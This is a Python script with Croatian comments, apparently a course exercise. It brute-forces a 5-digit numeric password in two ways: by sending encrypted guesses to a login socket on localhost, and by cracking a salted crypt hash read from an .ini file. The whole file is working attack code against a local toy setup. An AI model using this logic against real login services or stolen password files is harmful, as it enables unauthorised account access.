from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.serialization import load_pem_public_key
from cryptography.hazmat.primitives import hashes
import configparser
import socket
import string
import random
from time import sleep
import crypt
from hmac import compare_digest as compare_hash



def attack(type_of_attack):
    name = 'marin'
    # stvara proble kad radi preko socketa
    # ne moze generirati slati i primati tako brzo
    if type_of_attack == 1:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(('localhost', 8000))
        pub_key = sock.recv(4096)

        key = load_pem_public_key(pub_key)
        
        chiphertext = key.encrypt(
            name.encode(),
            padding.OAEP(
                mgf = padding.MGF1(algorithm=hashes.SHA256()),
                algorithm= hashes.SHA256(),
                label = None
            )
        )
        sock.send(chiphertext)

        for i in range(10000000000):
            breakInPass = ''
            for x in range(5):
                breakInPass += random.choice(string.digits)
            if i%1000==0:
                print('1000 pokusaja')
            chiphertext = key.encrypt(
                breakInPass.encode(),
                padding.OAEP(
                    mgf = padding.MGF1(algorithm=hashes.SHA256()),
                    algorithm= hashes.SHA256(),
                    label = None
                )
            )
            sleep(0.03)
            try:
                sock.send(chiphertext)
                primljeni_podaci = sock.recv(4096)
                primljeni_pozdrav = primljeni_podaci.decode()
                if primljeni_pozdrav == "True":
                    print('uspjesan login')
                    break
            except BrokenPipeError:
                continue 

    # napad ako znamo ime usera
    elif type_of_attack == 2:   
        readHash = configparser.ConfigParser()
        readHash.read('users-passwords.ini')

        saltToAdd = readHash[name]['salt']
        hashedUserPas = readHash[name]['password']

        for i in range(10000000000):
            breakInPass = ''
            # pretpostavljamo da lozinka ima 5 brojeva
            for x in range(5):
                    breakInPass += random.choice(string.digits) #ako znamo da ima lozinka ima samo brojke
                # breakInPass += random.choice(string.digits + string.ascii_letters) # jako dugo treba ako su i brojke i slova
            if not compare_hash(hashedUserPas, crypt.crypt(breakInPass, saltToAdd)):
                if i%10000 == 0 and i !=0:
                    print('{} pokusaja'.format(i))
                continue
            else:
                print('uspjesan login nakon {} pokusaja'.format(i)) 
                break
    return breakInPass
